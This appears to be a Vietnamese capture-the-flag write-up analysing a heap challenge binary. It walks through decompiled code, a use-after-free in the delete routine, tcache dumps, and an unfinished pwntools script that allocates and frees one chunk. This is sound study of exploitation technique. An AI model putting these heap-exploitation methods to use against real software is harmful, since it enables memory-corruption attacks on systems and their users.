### Thông tin file:

```c
└─$ file pwn1_ff 
pwn1_ff: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=b744398ed054457775b2ede2fc6f427f294fca56, stripped
```
```c
└─$ checksec --file=pwn1_ff  
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols  No     0               2               pwn1_ff
```
* `Partial RELRO`: overwrite GOT
* `No PIE`: địa chỉ binary tĩnh

Chương trinh đang thiếu loader, nên ta dùng patchelf:
```bash
└─$ patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2 pwn1_ff_copy
```

Output chương trình:

<img width="810" height="145" alt="image" src="https://github.com/user-attachments/assets/82bbb14c-712d-4920-b5aa-cd8f89d94834" />

Code từ ghidra (với các biến được đặt tên lại):
* `main()`:
```c
void main(void)
{
  int choice;
  
  init();
  puts("Ez heap challange !");
  do {
    while( true ) {
      while( true ) {
        menu();
        choice = read_input();
                    /* 1-create;2-delete;3-exit */
        if (choice != 2) break;
        delete();
      }
      if (2 < choice) break;
      if (choice == 1) {
        create();
      }
      else {
LAB_00400d2a:
        puts("no option");
      }
    }
    if (choice == 3) {
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (choice != 4) goto LAB_00400d2a;
    flag_check();
  } while( true );
}
```
`create()`:
```c
undefined8 create(void)
{
  uint size;
  data *data;
  char *content;
  int i;
  
  for (i = 0; (i < 9 && ((&database)[i] != (data *)0x0)); i = i + 1) {
  }
  printf("Input size:");
  size = read_input();
  if (size < 4097) {
    data = (data *)malloc(0x10);
    content = (char *)malloc((ulong)size);
    data->content = content;
    (&database)[i] = data;
    printf("Input data:");
    read(data->content,size);
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
* có `database` (là `DAT_006020e0` lúc trước) là vùng nhớ trên binary, chứa các pointer `data` từ 0 đến 8
* có `data` là vùng nhớ được cấp phát động trên heap để chứa pointer trỏ đến chunk của `content` cũng được cấp phát động theo `size` do người dùng đặt
* có `size` tối đa = `4096`, có thể tận dụng cho **heap overflow**
`delete()`:
```c
undefined8 delete(void)
{
  int index;
  undefined *ptr;
  
  printf("Input index:");
  index = read_input();
  if ((index < 10) && (-1 < index)) {
    if ((&database)[index] != (data *)0x0) {
      ptr = (&database)[index]->content;
      free((&database)[index]);
      free(ptr);
      (&database)[index]->content = (undefined *)0x0;
      (&database)[index] = (data *)0x0;
      puts("Done ");
    }
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
* có `free()` phần chunk của `content` chứa userdata mình nhập vào ("Input data:")
* có `free()` phần chunk của `data` chứa pointer đến chunk của `content`

==> Có thể khai thác lỗ hổng **Use-After-Free** để tái sử dụng phần chunk trên

`flag_check()`:
```c
undefined8 flag_check(void)

{
  if ((DAT_006020f0 != 0) && (*(long *)(DAT_006020f0 + 8) == 0xabcdef)) {
    get_flag();
  }
  return 0;
}
```
* có `DAT_006020f0` là vùng nhớ trên heap cận kề vùng `database` (`DAT_006020e0`):

<img width="695" height="447" alt="image" src="https://github.com/user-attachments/assets/4b9b37f5-5382-40d6-9b99-f3e132183f2c" />

* điều kiện để có flag là:
  ```
  DAT_006020f0 != 0
  DAT_006020f0 + 8 == 0xabcdef
  ```
* tuy nhiên `database` là list chỉ nhận 8 địa chỉ con trỏ, nên ta không thể overwrite đến được địa chỉ `DAT_006020f0` 
___
### Ý tưởng exploit:
* Tạo vùng nhớ data với `create()` và lưu pointer vào từ index 0 của `database`
    ```asm
    pwndbg> x/4gx 0x006020e0
    0x6020e0:       0x00000000154732a0      0x0000000000000000
    0x6020f0:       0x0000000000000000      0x0000000000000000
    ```
  bao gồm:
  * chunk `data` chứa pointer của `content` 
  * chunk `content` chứa phần data user input vào
  * Lấy `size` = 100 (0x70)
    ```asm
    pwndbg> heap
    Allocated chunk | PREV_INUSE
    Addr: 0x15473000
    Size: 0x290 (with flag bits: 0x291)
    
    Allocated chunk | PREV_INUSE
    Addr: 0x15473290
    Size: 0x20 (with flag bits: 0x21)
    
    Allocated chunk | PREV_INUSE
    Addr: 0x154732b0
    Size: 0x70 (with flag bits: 0x71)
    
    Top chunk | PREV_INUSE
    Addr: 0x15473320
    Size: 0x20ce0 (with flag bits: 0x20ce1)
    ```
    ```asm
    pwndbg> vis
    0x15473000      0x0000000000000000      0x0000000000000291      ................
    0x15473010      0x0000000000000000      0x0000000000000000      ................
    ...
    0x15473280      0x0000000000000000      0x0000000000000000      ................
    0x15473290      0x0000000000000000      0x0000000000000021      ........!.......
    0x154732a0      0x00000000154732c0      0x0000000000000000      .2G............. <== [data] chunk 
    0x154732b0      0x0000000000000000      0x0000000000000071      ........q.......
    0x154732c0      0x0000000000000000      0x0000000000000000      ................ <== [content] chunk
    0x154732d0      0x0000000000000000      0x0000000000000000      ................
    0x154732e0      0x0000000000000000      0x0000000000000000      ................
    0x154732f0      0x0000000000000000      0x0000000000000000      ................
    0x15473300      0x0000000000000000      0x0000000000000000      ................
    0x15473310      0x0000000000000000      0x0000000000000000      ................
    0x15473320      0x0000000000000000      0x0000000000020ce1      ................         <-- Top chunk
    ```
    <img width="820" height="237" alt="image" src="https://github.com/user-attachments/assets/b0819ea8-6760-4348-8844-721001829b90" />

* Giải phóng các chunk với `delete()`
  * cả chunk `content` và `data` được đưa vào bin tcache
    ```asm
    pwndbg> bins
    tcachebins
    0x20 [  1]: 0x154732a0 ◂— 0
    0x70 [  1]: 0x154732c0 ◂— 0
    ```
    ```asm
    Free chunk (tcachebins) | PREV_INUSE
    Addr: 0x15473290
    Size: 0x20 (with flag bits: 0x21)
    fd: 0x15473
    
    Free chunk (tcachebins) | PREV_INUSE
    Addr: 0x154732b0
    Size: 0x70 (with flag bits: 0x71)
    fd: 0x15473
    ```
    
    <img width="805" height="222" alt="image" src="https://github.com/user-attachments/assets/50ba5a8b-0dfd-4447-b450-3cce0b42d941" />
	
	```asm
	0x15473280      0x0000000000000000      0x0000000000000000      ................
	0x15473290      0x0000000000000000      0x0000000000000021      ........!.......
	0x154732a0      0x0000000000015473      0x62b23672cba2f66b      sT......k...r6.b         <-- tcachebins[0x20][0/1]
	0x154732b0      0x0000000000000000      0x0000000000000071      ........q.......
	0x154732c0      0x0000000000015473      0x62b23672cba2f66b      sT......k...r6.b         <-- tcachebins[0x70][0/1]
	0x154732d0      0x0000000000000000      0x0000000000000000      ................
	0x154732e0      0x0000000000000000      0x0000000000000000      ................
	0x154732f0      0x0000000000000000      0x0000000000000000      ................
	0x15473300      0x0000000000000000      0x0000000000000000      ................
	0x15473310      0x0000000000000000      0x0000000000000000      ................
	0x15473320      0x0000000000000000      0x0000000000020ce1      ................         <-- Top chunk
  	```

* Tái sử dụng các freed chunk trên với `create()`: 

TLDR:

ta có `data->content = content` nghĩa là lưu pointer của chunk content, rồi mới read vào con trỏ trong data->content. Vì vậy ta có thể overwrite địa chỉ con trỏ trong data->content với địa chỉ `DAT_006020f0`, rồi sau đó khi thực hiện `read()`, sẽ đọc vào đấy. Và ta sẽ đặt điều kiện theo flag.

phương pháp 1: tạo chunk đầu tiên, tạo chunk thứ 2, delete chunk đầu tiền, tạo chunk thứ 3 tái sử dụng freedchunk vừa rồi, thử overwrite chunk thứ 2 với địa chỉ `DAT_006020f0` (hơi bất thi khi mà size() giống trước, mà chunk thứ 2 được đặt sau nên ko với tới được)

phương pháp 2: tạo chunk đầu tiên (chunk content size = 100), free, tạo chunk 2 tải sử dụng phần freed chunk data, (chunk content size = 200 - tạo chunk mới từ top chunk), tạo chunk 3: phần chunk data tái sử dụng freed chunk (110 của freed chunk content) và (chunk size content = 300 - để tránh tái sử dụng cái chunk 110 kia). Nhiệm vụ là write data của chunk đầu với `DAT_006020f0` (hơi bất khả thi vì reuse chunk, chương trình sẽ overwrite lại chỗ đấy với pointer của chunk content (300).

___
`script.py`:
```python
from pwn import *

libc = ELF("./libc.2.23.so", checksec=False)

context.binary = exe = ELF("./pwn1_ff_copy", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		handle SIGALRM ignore
		# main
		br *0x400ca9
		# create
		br *0x400aa2
		br *0x400b06
		# delete
		br *0x400b67
		br *0x400bde

		# heap check:
		# heap [-v]
		# vis
		# vmmap
		# x/4gx 0x006020e0
		''')

p = process(exe.path)
GDB()

# create heap at [0] #############
p.sendlineafter(b">", b"1")
p.sendlineafter(b"size:", b"100")
p.sendlineafter(b"data:", b"AAAA")

# delete heap at [0] #############
p.sendlineafter(b">", b"2")
p.sendlineafter(b"index:", b"0")

# database: 0x006020e0

# flag_check: DAT_006020f0: != 0
# flag_check: DAT_006020f0 + 8: 0xabcdef

p.interactive()
```


___
doc:

https://www.youtube.com/watch?v=aU1_PXlMBhg















